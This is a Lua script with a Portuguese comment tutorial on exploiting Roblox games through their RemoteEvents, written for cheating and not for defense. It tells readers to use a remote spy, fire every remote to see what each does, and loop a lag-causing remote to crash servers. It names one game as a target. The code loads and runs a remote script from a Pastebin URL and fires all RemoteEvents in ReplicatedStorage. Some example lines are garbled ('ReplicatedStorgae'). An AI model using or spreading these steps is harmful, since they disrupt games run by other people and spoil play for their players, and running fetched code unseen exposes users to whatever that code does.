--[[
Simples vo ensinar como fuder Remotes no Roblox

Requisitos:
Saber Lua de ROBLOX pelo menos como funciona um remote, caso não saiba e simples
--
Um Remote e praticamente oque fode muito jogos, e o alvo principal de um exploiter,porque muitos jogos tem remotes totalmente merdas e remote e muito usado pra colocar coisas importantes e etc, exemplo: 
game:GetService('ReplicatedStorgae'):DeleteCar 
A Source deste remote pode ser qualquer coisa mais use um remote spy pra ver oque ele faz, apos ver você faz algum script que pode fuder o jogo de alguma forma, exemplo
for i,v in next(game.Workspace:GetDescendants()) do
game:GetService('ReplicatedStorgae'):DeleteCar(v)
end
--
Agora que você sabe oque e um remote vamos tentar fuder um jogo
exemplo: PM do Kaina, pessimos remotes, fiz ate um crasher mais Drezin skid deu fix lol
ai você usa o remote spy pra conseguir ver os remote e da fire all nos remote pra ver oque cada um faz (script abaixo^)  
--
Por exemplo tem alguns jogos que voce precisa usar remote spy por console msm, por conta que acho que alguns admin faz um remote pra impedir putas de backdoor.exe
tbm caso você achar um remote que aumente o ping, use um while wait() do end e KABOOM! você fez um Crasher pra tal Jogo
]] 

-- RemoteSpy que recomendo:
loadstring(game:HttpGet('https://pastebin.com/yJzq5ceV', true))()

-- Fire all Remotes recomendo demais:
for i,v in next(game.ReplicatedStorage:GetDescendants()) do
    if v:IsA('RemoteEvent') then
        v:FireServer()
    end
end

-- em alguns caso use um Remote Spy GUI para apareçer todos os remotes msm
